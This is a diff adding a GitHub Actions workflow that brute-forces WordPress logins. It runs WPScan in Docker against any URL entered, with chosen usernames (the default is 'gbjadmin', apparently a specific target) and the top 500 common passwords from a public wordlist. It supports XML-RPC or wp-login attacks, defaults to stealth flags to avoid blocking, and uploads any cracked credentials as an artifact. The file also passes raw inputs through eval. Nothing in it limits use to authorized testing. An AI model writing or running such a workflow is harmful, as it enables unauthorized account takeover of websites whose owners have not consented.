@@ -1,0 +1,90 @@
+name: WordPress Brute-Force Only
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: 'Target WordPress URL (e.g., https://example.com)'
+        required: true
+        type: string
+      usernames:
+        description: 'Comma-separated usernames (e.g., gbjadmin,admin)'
+        required: true
+        type: string
+        default: 'gbjadmin'
+      wordlist_url:
+        description: 'Password wordlist URL (direct .txt). Default: top 10k common.'
+        required: false
+        type: string
+        default: 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt'
+      limit_passwords:
+        description: 'Limit to top N passwords (e.g., 500) to avoid long runs/blocks'
+        required: false
+        type: string
+        default: '500'
+      password_attack:
+        description: 'Attack method'
+        required: false
+        type: choice
+        options: [xmlrpc, wp-login, auto]
+        default: 'auto'
+      extra_flags:
+        description: 'Additional WPScan flags (e.g., --stealthy --random-user-agent)'
+        required: false
+        type: string
+        default: '--stealthy'
+
+jobs:
+  bruteforce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Pull latest WPScan Docker image
+        run: docker pull wpscanteam/wpscan:latest
+
+      - name: Download and limit wordlist
+        run: |
+          curl -L -o /tmp/full-passwords.txt "${{ inputs.wordlist_url }}"
+          echo "Full wordlist downloaded: $(wc -l < /tmp/full-passwords.txt) passwords"
+
+          # Limit to top N (most common first)
+          head -n ${{ inputs.limit_passwords }} /tmp/full-passwords.txt > /tmp/passwords.txt
+          echo "Limited to top ${{ inputs.limit_passwords }} passwords"
+
+      - name: Run WPScan Brute-Force Only
+        env:
+          WPSCAN_API_TOKEN: ${{ secrets.WPSCAN_API_TOKEN }}  # Optional but recommended
+        run: |
+          # Build the attack method flag
+          if [ "${{ inputs.password_attack }}" = "xmlrpc" ]; then
+            ATTACK_FLAG="--password-attack xmlrpc"
+          elif [ "${{ inputs.password_attack }}" = "wp-login" ]; then
+            ATTACK_FLAG="--password-attack wp-login"
+          else
+            ATTACK_FLAG=""  # Let WPScan auto-choose (usually tries XML-RPC first if available)
+          fi
+
+          CMD="docker run --rm -v /tmp:/tmp wpscanteam/wpscan:latest \
+            --url '${{ inputs.target_url }}' \
+            --usernames '${{ inputs.usernames }}' \
+            --passwords /tmp/passwords.txt \
+            $ATTACK_FLAG \
+            ${{ inputs.extra_flags }} \
+            --format cli \
+            --output /tmp/bruteforce-report.txt \
+            --no-banner"
+
+          # Add API token only if set
+          if [ -n "$WPSCAN_API_TOKEN" ]; then
+            CMD="$CMD --api-token '$WPSCAN_API_TOKEN'"
+          fi
+
+          echo "Running brute-force..."
+          echo "$CMD"
+          eval $CMD || echo "Brute-force completed (may have been blocked or no matches)"
+
+      - name: Upload Brute-Force Report
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: bruteforce-report
+          path: /tmp/bruteforce-report.txt
